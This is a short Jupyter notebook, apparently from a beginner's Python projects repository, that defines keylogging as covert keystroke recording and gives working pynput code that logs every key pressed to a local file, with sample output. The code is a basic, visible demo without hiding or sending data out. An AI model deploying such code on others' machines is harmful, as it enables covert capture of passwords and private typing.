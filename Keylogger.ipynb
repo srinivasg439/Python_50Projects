{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c126a8c1",
   "metadata": {},
   "source": [
    "Introduction:\n",
    "Keystroke logging often referred to as keylogging or keyboard capturing, is the action of recording (logging) the keys struck on a keyboard, typically covertly so that a person using the keyboard is unaware that their actions are being monitored. Data can then be retrieved by the person operating the logging program.\n",
    "\n",
    "Using the python pynput package we can implement the keylogger concept. This library allows you to control and monitor input devices, that is how we will be monitoring the keyboard inputs to log the keystrokes."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eb694a42",
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key.ctrl_l released\n",
      "special key Key.shift pressed\n",
      "alphanumeric key K pressed\n",
      "'K' released\n",
      "Key.shift released\n",
      "alphanumeric key e pressed\n",
      "'e' released\n",
      "alphanumeric key y pressed\n",
      "'y' released\n",
      "alphanumeric key l pressed\n",
      "'l' released\n",
      "alphanumeric key o pressed\n",
      "'o' released\n",
      "alphanumeric key g pressed\n",
      "'g' released\n",
      "alphanumeric key g pressed\n",
      "'g' released\n",
      "alphanumeric key e pressed\n",
      "alphanumeric key r pressed\n",
      "'e' released\n",
      "'r' released\n"
     ]
    }
   ],
   "source": [
    "# keylogger using pynput module\n",
    " \n",
    "from pynput.keyboard import Key, Listener\n",
    " \n",
    "keys = [] # empty list to add the keystrokes\n",
    " \n",
    "# function to print which key is being pressed\n",
    "def on_press(key):\n",
    "    keys.append(key)\n",
    "    write_file(keys)\n",
    " \n",
    "    try:\n",
    "        print('alphanumeric key {0} pressed'.format(key.char))\n",
    " \n",
    "    except AttributeError:\n",
    "        print('special key {0} pressed'.format(key))\n",
    " \n",
    "# function to write the keystrokes to the log file\n",
    "def write_file(keys):\n",
    "    with open('log.txt', 'w') as f:\n",
    "        for key in keys:\n",
    "            # removing '' of the strings\n",
    "            k = str(key).replace(\"'\", \"\")\n",
    "            f.write(k)\n",
    "            # space between every keystroke for readability\n",
    "            f.write(' ')\n",
    " \n",
    "# function to print which key is being released and end Listener if esc is pressed\n",
    "def on_release(key):\n",
    "    print('{0} released'.format(key))\n",
    "    if key == Key.esc:\n",
    "        # Stop listener when esc is pressed\n",
    "        return False\n",
    " \n",
    " \n",
    "with Listener(on_press=on_press,\n",
    "              on_release=on_release) as listener:\n",
    "    listener.join() # joins all the keystrokes together"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
